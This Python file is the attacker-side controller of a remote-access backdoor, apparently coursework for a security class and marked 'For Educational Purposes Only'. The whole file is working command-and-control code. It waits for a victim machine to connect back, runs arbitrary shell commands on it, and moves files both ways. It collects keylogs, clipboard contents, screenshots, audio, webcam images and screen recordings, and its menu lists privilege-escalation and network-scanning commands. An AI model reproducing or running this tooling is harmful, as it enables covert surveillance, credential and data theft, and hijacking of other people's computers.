################################################
# Backdoor Controller (Attacker Side)          #
# WARNING: For Educational Purposes Only!      #
#                                              #
# USAGE: Run this on the ATTACKER machine      #
# This will listen for incoming connections    #
################################################

import socket
import json
import os
import sys
import time
from datetime import datetime


class BackdoorController:
    """Backdoor controller for the attacker machine"""

    def __init__(self, host='0.0.0.0', port=5555):
        """
        Initialize the backdoor controller (attacker-side server)
        
        Args:
            host: IP address to bind to (0.0.0.0 = listen on all interfaces)
            port: Port number to listen on for incoming connections
        """
        # Host and port configuration
        self.host = host
        self.port = port
        
        # Create main server socket for accepting connections
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow socket reuse to avoid "address already in use" errors
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Socket for communicating with target machine
        self.target_socket = None
        # Address (IP, port) of connected target
        self.target_address = None
    
    def reliable_send(self, data):
        """
        Send data reliably to the target machine
        
        Converts data to JSON format and encodes to bytes before sending.
        This ensures data integrity during transmission.
        
        Args:
            data: Any JSON-serializable data to send to target
        """
        try:
            jsondata = json.dumps(data)
            self.target_socket.send(jsondata.encode())
        except Exception as e:
            print(f"[!] Error sending data: {e}")
    
    def reliable_recv(self):
        """
        Receive data reliably from the target machine
        
        Receives data in chunks and attempts to parse as JSON.
        Continues receiving until valid JSON is obtained.
        
        Returns:
            Parsed JSON data from target, or None if error occurs
        """
        data = ''
        while True:
            try:
                data = data + self.target_socket.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue
            except Exception as e:
                print(f"[!] Error receiving data: {e}")
                return None
    
    def upload_file(self, file_name):
        """
        Upload a file from attacker machine to target machine
        
        Reads the specified file and sends its binary content to target.
        
        Args:
            file_name: Path to the file on attacker machine to upload
        """
        try:
            with open(file_name, 'rb') as f:
                self.target_socket.send(f.read())
            print(f"[+] File uploaded: {file_name}")
        except FileNotFoundError:
            print(f"[!] File not found: {file_name}")
        except Exception as e:
            print(f"[!] Error uploading file: {e}")
    
    def download_file(self, file_name):
        """
        Download a file from target machine to attacker machine
        
        Receives file content in chunks and saves to appropriate directory
        based on file type. Automatically organizes files into logs subdirectories.
        
        Args:
            file_name: Name or path of file on target machine to download
        """
        try:
            # Determine the appropriate logs subdirectory based on file type
            local_file = self._get_local_download_path(file_name)
            
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(local_file), exist_ok=True)
            
            with open(local_file, 'wb') as f:
                self.target_socket.settimeout(1)
                chunk = self.target_socket.recv(1024)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = self.target_socket.recv(1024)
                    except socket.timeout:
                        break
                self.target_socket.settimeout(None)
            print(f"[+] File downloaded: {local_file}")
        except Exception as e:
            print(f"[!] Error downloading file: {e}")
    
    def _get_local_download_path(self, remote_file):
        """
        Determine the local download path based on remote file path
        
        Organizes downloaded files into appropriate subdirectories:
        - screenshots -> logs/screenshots/
        - audio -> logs/audio/
        - recordings -> logs/recordings/
        - webcam -> logs/webcam/
        - keylog -> logs/keylog/
        - clipboard -> logs/clipboard/
        
        Args:
            remote_file: Path or name of file from target machine
            
        Returns:
            Organized local file path
        """
        # Extract just the filename if it's a full path
        filename = os.path.basename(remote_file)
        
        # Check if the remote file contains a logs/ path structure
        if 'logs/screenshots' in remote_file or 'screenshot' in filename:
            return os.path.join('logs', 'screenshots', filename)
        elif 'logs/audio' in remote_file or (filename.startswith('audio_') and filename.endswith('.wav')):
            return os.path.join('logs', 'audio', filename)
        elif 'logs/recordings' in remote_file or 'screen_recording' in filename or 'recording' in filename:
            return os.path.join('logs', 'recordings', filename)
        elif 'logs/webcam' in remote_file or 'webcam' in filename:
            return os.path.join('logs', 'webcam', filename)
        elif 'logs/keylog' in remote_file or 'keylog' in filename:
            return os.path.join('logs', 'keylog', filename)
        elif 'logs/clipboard' in remote_file or 'clipboard' in filename:
            return os.path.join('logs', 'clipboard', filename)
        else:
            # Default: save to current directory
            return filename
    
    def start_listener(self):
        """
        Start listening for incoming connections from target machine
        
        Binds to specified host:port and waits for target to connect.
        Once connected, requests initial system information from target.
        
        Returns:
            True if connection established successfully, False otherwise
        """
        try:
            # Bind socket to host and port
            self.server_socket.bind((self.host, self.port))
            # Listen for up to 5 queued connections
            self.server_socket.listen(5)
            print(f"[+] Listening on {self.host}:{self.port}")
            print("[*] Waiting for incoming connections...")
            
            # Accept incoming connection (blocks until connection received)
            self.target_socket, self.target_address = self.server_socket.accept()
            print(f"[+] Connection established from {self.target_address[0]}:{self.target_address[1]}")
            
            # Send initial system info request
            self.reliable_send('sysinfo')
            result = self.reliable_recv()
            if result:
                print(result)
            
            return True
        except Exception as e:
            print(f"[!] Error starting listener: {e}")
            return False
    
    def print_banner(self):
        """Print banner and help information"""
        banner = """
        ╔═══════════════════════════════════════════════════════════════╗
        ║           Enhanced Backdoor Controller v2.0                   ║
        ║              For Educational Purposes Only!                   ║
        ║                  DES484 - SIIT 2024                          ║
        ╚═══════════════════════════════════════════════════════════════╝

        Type 'help' for available commands.
        """
        print(banner)
    
    def print_help(self):
        """Print help information with all commands"""
        help_text = """
        ╔═══════════════════════════════════════════════════════════════╗
        ║                     AVAILABLE COMMANDS                        ║
        ╚═══════════════════════════════════════════════════════════════╝

        BASIC COMMANDS:
        help                - Show this help message
        clear               - Clear screen
        sysinfo             - Get system information
        cd <directory>      - Change directory on target
        download <file>     - Download file from target
        upload <file>       - Upload file to target
        quit                - Close connection and exit

        KEYLOGGER:
        keylog_start        - Start keylogger
        keylog_stop         - Stop keylogger
        keylog_dump         - Download keylog file (saved as keylog_dump_TIMESTAMP.txt)
        keylog_clear        - Clear keylog file
        keylog_status       - Check keylogger status
        keylog_manual <text> - Manually log text (fallback mode)

        PRIVILEGE ESCALATION:
        priv_check          - Check current privileges
        priv_enum           - Enumerate privilege escalation vectors
        priv_services       - List running services
        priv_tasks          - List scheduled tasks
        priv_sensitive      - Find sensitive files

        SCREEN & MEDIA:
        screenshot          - Capture single screenshot
        screenshot_multi <count> <interval> - Capture multiple screenshots
        screenshot_list     - List captured screenshots
        audio_record <sec>  - Record audio (default 10 seconds)
        audio_list          - List audio recordings
        record_screen <sec> <fps> - Record screen (default 10s, 15fps)
        record_start <max>  - Start background recording (max duration in seconds)
        record_stop         - Stop background recording
        record_status       - Check recording status
        record_list         - List screen recordings
        webcam_snap         - Capture webcam image

        NETWORK DISCOVERY:
        net_info            - Display network information
        net_scan            - Scan local network for hosts
        net_connections     - Show active network connections
        net_portscan <host> - Scan common ports on host
        net_public_ip       - Get public IP address
        net_check_internet  - Check internet connectivity

        CLIPBOARD STEALER:
        clipboard_start     - Start monitoring clipboard
        clipboard_stop      - Stop monitoring clipboard
        clipboard_status    - Check clipboard monitor status
        clipboard_get       - Get current clipboard content
        clipboard_set <text> - Set clipboard content
        clipboard_dump      - Download clipboard log file
        clipboard_clear     - Clear clipboard logs
        clipboard_list      - List all clipboard log files

        Any other command will be executed as a shell command on the target.
        """
        print(help_text)
    
    def command_loop(self):
        """Main command loop"""
        while True:
            try:
                # Get command from attacker
                command = input(f"\n[{self.target_address[0]}]> ").strip()
                
                if not command:
                    continue
                
                # Handle local commands
                if command == 'help':
                    self.print_help()
                    continue
                
                elif command == 'clear':
                    os.system('clear' if os.name != 'nt' else 'cls')
                    continue
                
                elif command == 'quit':
                    self.reliable_send('quit')
                    print("[*] Connection closed.")
                    break
                
                elif command[:8] == 'download':
                    self.reliable_send(command)
                    # Receive the file
                    file_name = command[9:]
                    self.download_file(file_name)
                    continue
                
                elif command == 'keylog_dump':
                    # Special handling for keylog_dump - sends file automatically
                    self.reliable_send(command)
                    # First receive the status message
                    result = self.reliable_recv()
                    print("\n" + str(result))
                    
                    # If file exists, receive it
                    if result and "Keylog file ready" in result:
                        # Extract filename from message or use default
                        import re
                        match = re.search(r'Keylog file ready: (.+)', result)
                        if match:
                            remote_file = match.group(1)
                            # Create local filename with timestamp
                            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                            local_file = os.path.join('logs', 'keylog', f'keylog_dump_{timestamp}.txt')
                            
                            # Create directory if it doesn't exist
                            os.makedirs(os.path.dirname(local_file), exist_ok=True)
                            
                            print(f"[*] Downloading keylog file...")
                            try:
                                with open(local_file, 'wb') as f:
                                    self.target_socket.settimeout(3)
                                    chunk = self.target_socket.recv(1024)
                                    while chunk:
                                        f.write(chunk)
                                        try:
                                            chunk = self.target_socket.recv(1024)
                                        except socket.timeout:
                                            break
                                    self.target_socket.settimeout(None)
                                print(f"[+] Keylog file downloaded: {local_file}")
                                
                                # Also display the content
                                with open(local_file, 'r', encoding='utf-8') as f:
                                    content = f.read()
                                    if content:
                                        print("\n=== Keylog Content ===")
                                        print(content)
                                        print("=== End of Keylog ===\n")
                            except Exception as e:
                                print(f"[!] Error downloading keylog file: {e}")
                    continue
                
                elif command == 'clipboard_dump':
                    # Special handling for clipboard_dump - sends file automatically
                    self.reliable_send(command)
                    # First receive the status message
                    result = self.reliable_recv()
                    print("\n" + str(result))
                    
                    # If file exists, receive it
                    if result and "Clipboard log file ready" in result:
                        # Extract filename from message or use default
                        import re
                        match = re.search(r'Clipboard log file ready: (.+)', result)
                        if match:
                            remote_file = match.group(1)
                            # Create local filename with timestamp
                            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                            local_file = os.path.join('logs', 'clipboard', f'clipboard_dump_{timestamp}.txt')
                            
                            # Create directory if it doesn't exist
                            os.makedirs(os.path.dirname(local_file), exist_ok=True)
                            
                            print(f"[*] Downloading clipboard log file...")
                            try:
                                with open(local_file, 'wb') as f:
                                    self.target_socket.settimeout(3)
                                    chunk = self.target_socket.recv(1024)
                                    while chunk:
                                        f.write(chunk)
                                        try:
                                            chunk = self.target_socket.recv(1024)
                                        except socket.timeout:
                                            break
                                    self.target_socket.settimeout(None)
                                print(f"[+] Clipboard log file downloaded: {local_file}")
                                
                                # Also display the content
                                with open(local_file, 'r', encoding='utf-8') as f:
                                    content = f.read()
                                    if content:
                                        print("\n=== Clipboard Log Content ===")
                                        print(content)
                                        print("=== End of Clipboard Log ===\n")
                            except Exception as e:
                                print(f"[!] Error downloading clipboard log file: {e}")
                    continue
                
                elif command[:6] == 'upload':
                    file_name = command[7:]
                    self.reliable_send(command)
                    time.sleep(0.5)  # Small delay for synchronization
                    self.upload_file(file_name)
                    continue
                
                # Send command to target and receive result
                self.reliable_send(command)
                
                # Receive and display result (unless it's upload/download)
                result = self.reliable_recv()
                if result:
                    print("\n" + str(result))
            
            except KeyboardInterrupt:
                print("\n[!] Ctrl+C detected. Type 'quit' to exit properly.")
            except Exception as e:
                print(f"[!] Error in command loop: {e}")
                break
    
    def run(self):
        """Main execution flow"""
        self.print_banner()
        
        if self.start_listener():
            try:
                self.command_loop()
            except Exception as e:
                print(f"[!] Error: {e}")
            finally:
                self.cleanup()
        else:
            print("[!] Failed to start listener.")
            self.cleanup()
    
    def cleanup(self):
        """Clean up resources"""
        try:
            if self.target_socket:
                self.target_socket.close()
            if self.server_socket:
                self.server_socket.close()
            print("[*] Resources cleaned up.")
        except:
            pass


def main():
    """
    Main entry point for the backdoor server (attacker side)
    
    Configures and starts the backdoor controller to listen for
    incoming connections from target machines.
    """
    print("=" * 70)
    print("  Backdoor Server - ATTACKER SIDE")
    print("  This program LISTENS for incoming connections")
    print("  WARNING: For Educational Purposes Only!")
    print("=" * 70)
    
    # Configuration - these must match the settings in backdoor.py on target
    HOST = '0.0.0.0'  # Listen on all interfaces (0.0.0.0)
    PORT = 5557     # Port to listen on (must match ATTACKER_PORT in backdoor.py)
    
    # Allow command-line arguments for port
    if len(sys.argv) > 1:
        PORT = int(sys.argv[1])
    
    print(f"\n[*] Server will listen on: {HOST}:{PORT}")
    print("[*] Waiting for target to connect back...")
    print("=" * 70 + "\n")
    
    # Create and run controller
    controller = BackdoorController(HOST, PORT)
    controller.run()


if __name__ == "__main__":
    main()
